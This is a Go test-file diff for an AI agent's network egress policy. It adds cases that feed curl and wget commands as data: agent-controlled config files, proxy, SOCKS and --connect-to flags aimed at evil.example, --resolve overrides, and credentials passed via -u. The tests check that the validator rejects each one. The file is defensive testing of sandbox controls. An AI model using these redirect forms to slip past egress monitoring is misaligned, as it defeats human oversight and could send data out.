@@ -102,6 +102,89 @@ func TestValidateNetworkEgressRejectsDirectClientWithoutInspectableDestination(t
 	}
 }
 
+func TestValidateNetworkEgressRejectsDirectClientDecoyDomainFlags(t *testing.T) {
+	policy := DefaultControlPlanePolicy{
+		Network: config.NetworkEgressPolicy{
+			Enabled:            true,
+			RequireIntentMatch: true,
+			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
+		},
+	}
+
+	for _, cmd := range [][]string{
+		{"curl", "--config", "./agent.cfg", "-u", "api.github.com:token"},
+		{"curl", "--config", "./agent.cfg", "--proxy", "api.github.com:443"},
+		{"wget", "--config", "./agent.cfg", "--output-document", "api.github.com"},
+	} {
+		err := policy.ValidateNetworkEgress(cmd, "run_tests")
+		if err == nil {
+			t.Fatalf("expected decoy destination form %q to be rejected", strings.Join(cmd, " "))
+		}
+		if !strings.Contains(err.Error(), "inspectable destination") {
+			t.Fatalf("expected inspectable-destination deny detail for %q, got %v", strings.Join(cmd, " "), err)
+		}
+	}
+}
+
+func TestValidateNetworkEgressRejectsDecoyDomainLikeValuesOnNonDestinationArgs(t *testing.T) {
+	policy := DefaultControlPlanePolicy{
+		Network: config.NetworkEgressPolicy{
+			Enabled:            true,
+			RequireIntentMatch: true,
+			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
+		},
+	}
+
+	for _, cmd := range [][]string{
+		{"curl", "--config", "./agent-controlled.cfg", "-u", "api.github.com:token"},
+		{"curl", "--config", "./agent-controlled.cfg", "--proxy", "api.github.com:443"},
+		{"wget", "--config", "./agent-controlled.cfg", "--output-document", "api.github.com"},
+	} {
+		err := policy.ValidateNetworkEgress(cmd, "run_tests")
+		if err == nil {
+			t.Fatalf("expected decoy destination args to be rejected for %q", strings.Join(cmd, " "))
+		}
+		if !strings.Contains(err.Error(), "inspectable destination") {
+			t.Fatalf("expected inspectable-destination deny for %q, got %v", strings.Join(cmd, " "), err)
+		}
+	}
+}
+
+func TestValidateNetworkEgressRejectsOpaqueOrDestinationOverrideArgsEvenWithInspectableURL(t *testing.T) {
+	policy := DefaultControlPlanePolicy{
+		Network: config.NetworkEgressPolicy{
+			Enabled:            true,
+			RequireIntentMatch: true,
+			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
+		},
+	}
+
+	for _, cmd := range [][]string{
+		{"curl", "https://api.github.com/repos", "--config", "./agent-controlled.cfg"},
+		{"curl", "https://api.github.com/repos", "--proxy", "http://evil.example:8080"},
+		{"curl", "https://api.github.com/repos", "--proxy1.0", "http://evil.example:8080"},
+		{"curl", "https://api.github.com/repos", "--preproxy", "http://evil.example:8080"},
+		{"curl", "https://api.github.com/repos", "--connect-to", "api.github.com:443:evil.example:443"},
+		{"curl", "https://api.github.com/repos", "--resolve", "api.github.com:443:10.0.0.1"},
+		{"curl", "https://api.github.com/repos", "--socks4", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--socks4a", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--socks5", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--socks5-hostname", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--future-route-override", "evil.example"},
+		{"wget", "https://api.github.com/repos", "--config", "./agent-controlled.cfg"},
+		{"wget", "https://api.github.com/repos", "--input-file", "./urls.txt"},
+		{"wget", "https://api.github.com/repos", "--execute", "use_proxy=on"},
+	} {
+		err := policy.ValidateNetworkEgress(cmd, "run_tests")
+		if err == nil {
+			t.Fatalf("expected opaque/destination-override args to be rejected for %q", strings.Join(cmd, " "))
+		}
+		if !strings.Contains(err.Error(), "opaque or destination-override") {
+			t.Fatalf("expected opaque/destination-override deny for %q, got %v", strings.Join(cmd, " "), err)
+		}
+	}
+}
+
 func TestRedactOutputScrubsBearerAndEnvTokenShapes(t *testing.T) {
 	githubToken := "gh" + "p_" + "abcdef1234567890"
 	openAIToken := "sk" + "-live-" + "abcdef1234567890"
